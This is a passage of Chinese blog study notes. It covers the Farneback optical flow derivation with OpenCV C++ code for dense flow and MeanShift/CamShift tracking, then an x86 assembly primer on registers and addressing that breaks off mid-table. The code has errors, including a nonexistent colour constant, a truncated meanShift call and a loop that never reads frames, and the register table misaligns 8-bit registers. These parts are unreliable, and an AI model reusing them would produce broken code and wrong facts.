size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0413309999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.138331em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub><mo>=</mo><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_2=A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>b</mi><mn>2</mn></msub><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mo>−</mo><mn>2</mn><msub><mi>A</mi><mn>1</mn></msub><mi>d</mi></mrow><annotation encoding="application/x-tex">b_2=b_1-2A_1d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><msup><mi>d</mi><mi>T</mi></msup><msub><mi>A</mi><mn>1</mn></msub><mi>d</mi><mo>−</mo><msubsup><mi>b</mi><mn>1</mn><mi>T</mi></msubsup><mi>d</mi><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">c2=d^TA_1d-b^T_1d+c_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0413309999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.138331em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li>可以看到系数A不变，b和c的变化和d相关。求取d转成了求取系数</li><li>假定ROI窗口共用相同的系数，组成多约束方程求解，用最小二乘拟合，得到系数结果求解d，全局总位移。根据求解的d，又可以反推系数，不断迭代循环，直至系数足够精准。得到光流场</li></ul><h3 id="代码实现-19"><a class="markdownIt-Anchor" href="#代码实现-19"></a> 代码实现</h3><ul><li>笛卡尔坐标系转成极坐标系，使用HSV色彩空间进行展现出稠密光流场</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat frame,preFrame,gray,preGray;</span><br><span class="line">capture.read(preFrame);</span><br><span class="line">cvtColor(preFrame,preGray,COLOR_BGR2GRAY);</span><br><span class="line">Mat hsv=Mat::zeros(preFrame.size(),preFrame.type());</span><br><span class="line">Mat mag=Mat::zeros(hsv.size(),CV_32FC1);</span><br><span class="line"><span class="comment">//角度</span></span><br><span class="line">Mat ang=Mat::zeros(hsv.size(),CV_32FC1);</span><br><span class="line"><span class="comment">//x</span></span><br><span class="line">Mat xpts=Mat::zeros(hsv.size(),CV_32FC1);</span><br><span class="line"><span class="comment">//y</span></span><br><span class="line">Mat ypts=Mat::zeros(hsv.size(),CV_32FC1);</span><br><span class="line"><span class="comment">//光流输出</span></span><br><span class="line">Mat_&lt;Point2f&gt;flow;</span><br><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;mv;</span><br><span class="line">split(hsv,mv);</span><br><span class="line">Mat dst;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">  cvtColor(frame,gray,COLOR_BGR2GRAY);</span><br><span class="line">  <span class="comment">//preframe,curframe,flow,金字塔层间的scale,金字塔层数,窗口大小,迭代次数,多项式,高斯配置权重,flag</span></span><br><span class="line">  calcOpticalFlowFarneback(preGray,gray,flow,<span class="number">0.5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1.2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;flow.rows;row++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;flow.cols;col++)&#123;</span><br><span class="line">      <span class="keyword">const</span> Point2f &amp;flow_xy=flow.at&lt;Point2f&gt;(row,col);</span><br><span class="line">      xpts.at&lt;<span class="keyword">float</span>&gt;(row,col)=flow_xy.x;</span><br><span class="line">      ypts.at&lt;<span class="keyword">float</span>&gt;(row,col)=flow_xy.y;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//变为极坐标</span></span><br><span class="line">  cartToPolar(xpts,ypts,mag,ang);</span><br><span class="line">  ang=ang*<span class="number">180</span>/CV_PI/<span class="number">2.0</span>;</span><br><span class="line">  normalize(mag,mag,<span class="number">0</span>,<span class="number">255</span>,NORM_MINMAX);</span><br><span class="line">  convertScaleAbs(mag,mag);</span><br><span class="line">  convertScaleAbs(ang,ang);</span><br><span class="line">  mv[<span class="number">0</span>]=ang;</span><br><span class="line">  mv[<span class="number">1</span>]=Scalar(<span class="number">255</span>);</span><br><span class="line">  mv[<span class="number">2</span>]=mag;</span><br><span class="line">  merge(mv,hsv);</span><br><span class="line">  cvtColor(hsv,dst,COLOR_HSV2BRGR);</span><br><span class="line">  imshow(<span class="string">&quot;dst&quot;</span>,dst);</span><br><span class="line">  imshow(<span class="string">&quot;frame&quot;</span>,frame);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于均值迁移的视频分析"><a class="markdownIt-Anchor" href="#基于均值迁移的视频分析"></a> 基于均值迁移的视频分析</h2><h3 id="均值迁移算法原理"><a class="markdownIt-Anchor" href="#均值迁移算法原理"></a> 均值迁移算法原理</h3><ul><li>随机在空间中画圆，计算包含在圆中的点的均值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{x}\bar{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7622199999999999em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˉ</span></span></span></span></span></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span>，计算圆的中心位置和均值x,y的位置距离，圆不断向均值移动，直到稳定位置，就到了目标。</li></ul><h3 id="均值迁移-meanshift"><a class="markdownIt-Anchor" href="#均值迁移-meanshift"></a> 均值迁移-MeanShift</h3><ul><li>基于直方图反向投影，提供ROI区域</li></ul><h3 id="自适应均值迁移-ca-meanshift"><a class="markdownIt-Anchor" href="#自适应均值迁移-ca-meanshift"></a> 自适应均值迁移-CA-MeanShift</h3><ul><li>在均值迁移的基础上，每次都重新拟合椭圆，自适应变化窗口大小。</li></ul><h3 id="代码实现-20"><a class="markdownIt-Anchor" href="#代码实现-20"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat frame,hsv,hue,mask,hist,backproj;</span><br><span class="line">capture.read(frame);</span><br><span class="line"><span class="keyword">int</span> hsize=<span class="number">16</span>;</span><br><span class="line"><span class="keyword">float</span> hranges[]=&#123;<span class="number">0</span>,<span class="number">180</span>&#125;;</span><br><span class="line">Rect trackWindow;</span><br><span class="line"><span class="keyword">bool</span> init=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">float</span>* ranges=hranges;</span><br><span class="line">Rect selection=selectROI(<span class="string">&quot;window name&quot;</span>,frame,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">  capture.read(frame);</span><br><span class="line">  cvtColor(frame,hsv,COLOR_BGR2HSV);</span><br><span class="line">  <span class="comment">//选取黄色作为跟踪目标</span></span><br><span class="line">  inRange(hsv,Scalar(<span class="number">26</span>,<span class="number">43</span>,<span class="number">46</span>),Scalar(<span class="number">34</span>,<span class="number">255</span>,<span class="number">255</span>),mask);</span><br><span class="line">  <span class="comment">//这里只搜索H通道，加快速度</span></span><br><span class="line">  <span class="keyword">int</span> ch[]=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  hue.create(hsv.size(),hsv.depth());</span><br><span class="line">  <span class="comment">//只取出1个通道：H</span></span><br><span class="line">  <span class="comment">//src,1,dst,</span></span><br><span class="line">  mixChannels(&amp;hsv,<span class="number">1</span>,&amp;hue,<span class="number">1</span>,ch,<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(init)&#123;</span><br><span class="line">    <span class="comment">//计算ROI的直方图</span></span><br><span class="line">    init=<span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//只计算H通道的</span></span><br><span class="line">    Mat roi(hue,selection),maskroi(mask,selection);</span><br><span class="line">    calcHist(&amp;roi,<span class="number">1</span>,<span class="number">0</span>,maskroi,hist,<span class="number">1</span>,&amp;hsize,&amp;ranges);</span><br><span class="line">    normalize(hist,hist,<span class="number">0</span>,<span class="number">255</span>,NORM_MINMAX);</span><br><span class="line">    trackWindow=selection;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//ht通道，通道数，0，hist，dst，ranges</span></span><br><span class="line">  calcBackProject(&amp;hue,<span class="number">1</span>,<span class="number">0</span>,hist,backproj,&amp;ranges);</span><br><span class="line">  <span class="comment">//meanshift：</span></span><br><span class="line">  <span class="comment">//将backproj中不在mask部分去除</span></span><br><span class="line">  backproj &amp;= mask;</span><br><span class="line">  meanShift(backproj,trackWindow,TermCriteria(TermCriteria::COUNT|</span><br><span class="line">  <span class="comment">//连续自适应均值偏移</span></span><br><span class="line">  <span class="comment">//RotatedRect rrt=CamShift(backproj,trackWindow,TermCriteria(TermCriteria::COUNT| TermCriteria::EPS),10,1);</span></span><br><span class="line">  <span class="comment">//ellipse(frame,rrt,Scalar(0,0,255),2,8);</span></span><br><span class="line">  rectangle(frame,trackWindow,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">3</span>,LINE_AA);</span><br><span class="line">  imshow(<span class="string">&quot;meanshift&quot;</span>,frame);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> robotic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编</title>
      <link href="/2020/07/27/%E6%B1%87%E7%BC%96/"/>
      <url>/2020/07/27/%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>汇编语言</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><ul><li>DTDebug</li></ul><h1 id="位运算"><a class="markdownIt-Anchor" href="#位运算"></a> 位运算</h1><ul><li>进制</li></ul><h2 id="操作符"><a class="markdownIt-Anchor" href="#操作符"></a> 操作符</h2><table><thead><tr><th>位运算</th><th></th></tr></thead><tbody><tr><td>and</td><td>与</td></tr><tr><td>or</td><td>或</td></tr><tr><td>not</td><td>非</td></tr><tr><td>xor</td><td>异或</td></tr><tr><td>shl</td><td>左移</td></tr><tr><td>shr</td><td>右移，高位补0，C语言使用unsigned类型时，就会补0</td></tr><tr><td>sar</td><td>右移，高位补符号位，signed</td></tr></tbody></table><h1 id="存储"><a class="markdownIt-Anchor" href="#存储"></a> 存储</h1><h2 id="通用寄存器"><a class="markdownIt-Anchor" href="#通用寄存器"></a> 通用寄存器</h2><ul><li>计算机可以在三个地方存储数据，cpu、内存、硬盘。寄存器就是用于cpu存储数据的。</li></ul><h3 id="寄存器组成"><a class="markdownIt-Anchor" href="#寄存器组成"></a> 寄存器组成</h3><ul><li>包含8个通用寄存器可以存储任意数据。</li><li>16位、32位的寄存器都指向了同一个地址，只是赋值时，影响的位数不同。</li><li>8位寄存器，近用了ABCD四个寄存器，将高8位和第八位拆成了AL、BL、CL、DL、AH、BH、CH、DH，8个寄存器。</li></ul><table><thead><tr><th>32位通用寄存器</th><th>16位通用寄存器</th><th>8位通用寄存器</th><th>用途</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AL</td><td>作为返回值</td></tr><tr><td>EBX</td><td>BX</td><td>BL</td><td></td></tr><tr><td>ECX</td><td>CX</td><td>CL</td><td>计数寄存器</td></tr><tr><td>EDX</td><td>DX</td><td>DL</td><td></td></tr><tr><td>ESP</td><td>SP</td><td>AH</td><td>栈指针寄存器，栈顶指针</td></tr><tr><td>EBP</td><td>BP</td><td>BH</td><td>栈底指针</td></tr><tr><td>ESI</td><td>SI</td><td>CH</td><td>串赋值的源地址</td></tr><tr><td>EDI</td><td>DI</td><td>DH</td><td>出赋值的目的地址</td></tr></tbody></table><h3 id="寄存器读写"><a class="markdownIt-Anchor" href="#寄存器读写"></a> 寄存器读写</h3><table><thead><tr><th>指令</th><th></th></tr></thead><tbody><tr><td>立即数到寄存器</td><td><code>MOV EAX,1</code></td></tr><tr><td>寄存器到寄存器</td><td><code>MOV EAX,EBX</code></td></tr></tbody></table><h2 id="内存"><a class="markdownIt-Anchor" href="#内存"></a> 内存</h2><ul><li>对于32位寻址空间的计算机，内存最大可支持4GB</li><li>由于内存太大了，没办法起名字，只能用地址编号代替</li></ul><h3 id="内存读写"><a class="markdownIt-Anchor" href="#内存读写"></a> 内存读写</h3><ul><li>汇编指令中，绝大多数指令，不允许从内存到内存。可以通过寄存器进行存储。</li><li>MOVS指令可以实现内存到内存的移动。</li></ul><table><thead><tr><th>指令</th><th></th></tr></thead><tbody><tr><td>立即数到内存</td><td><code>MOV BYTE ptr ds:[0018FFF0], 1</code></td></tr><tr><td>寄存器到内存</td><td><code>MOV DWORD ptr ds:[0018FFF0], EAX</code></td></tr><tr><td>内存到寄存器</td><td><code>MOV EAX,DWORD ptr ds:[0018FFF0]</code></td></tr></tbody></table><table><thead><tr><th>写入的宽度</th><th></th></tr></thead><tbody><tr><td>BYTE</td><td>一字节</td></tr><tr><td>WORD</td><td>二字节</td></tr><tr><td>DWORD</td><td>四字节</td></tr></tbody></table><h3 id="内存地址的表示"><a class="markdownIt-Anchor" href="#内存地址的表示"></a> 内存地址的表示</h3><ul><li>5中形式</li></ul><table><thead><tr><th>表达形式</th><th></th><th></th></tr></thead><tbody><tr><td>立即数</td><td>0x13FFC4</td><td><code>MOV EAX,DWORD PTR DS:[0x13FFC4]</code></td></tr><tr><td><code>[reg]</code></td><td>八个寄存器的任意一个，读取里面的地址</td><td><code>MOV EAX,DWORD PTR DS:[ECX]</code></td></tr><tr><td><code>[reg+立即数]</code></td><td>寄存器+立即数，立即数表示了偏移量</td><td><code>MOV EAX,DWORD PTR DS:[ECX+4]</code></td></tr><tr><td><code>[reg+reg*&#123;1,2,4,8&#125;]</code></td><td>寄存器+寄存器*2的倍数，后者也代表偏移量</td><td><code>MOV EAX,DWORD PTR DS:[ECX+EAX*4]</code></td></tr><tr><td><code>[reg+reg*&#123;1,2,4,8&#125;]+立即数</code></td><td>寄存器+寄存器*2的倍数+立即数</td><td><code>MOV EAX,DWORD PTR DS:[ECX+EAX*4+4]</code></td></tr></tbody></table><h3 id="内存存储模式"><a class="markdownIt-Anchor" href="#内存存储模式"></a> 内存存储模式</h3><ul><li>大端模式：数据高位在低位，数据低位在高位</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x1A2C   高位--&gt;低位</span><br><span class="line">0x0001  2C   高位</span><br><span class="line">0x0000  1A   低位</span><br></pre></td></tr></table></figure><ul><li>小端模式：数据高位在高位，数据低位在低位</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x1A2C</span><br><span class="line">0x0001  1A</span><br><span class="line">0x0000  2C</span><br></pre></td></tr></table></figure><h1 id="常用指令"><a class="markdownIt-Anchor" href="#常用指令"></a> 常用指令</h1><h2 id="写指令"><a class="markdownIt-Anchor" href="#写指令"></a> 写指令</h2><table><thead><tr><th>指令</th><th></th><th></th></tr></thead><tbody><tr><td>MOV a,b</td><td>b存储到a</td><td></td></tr><tr><td>ADD a,b</td><td>加法，a += b</td><td></td></tr><tr><td>SUB a,b</td><td>减法，a -= b</td><td></td></tr><tr><td>AND a,b</td><td>与，a &amp;= 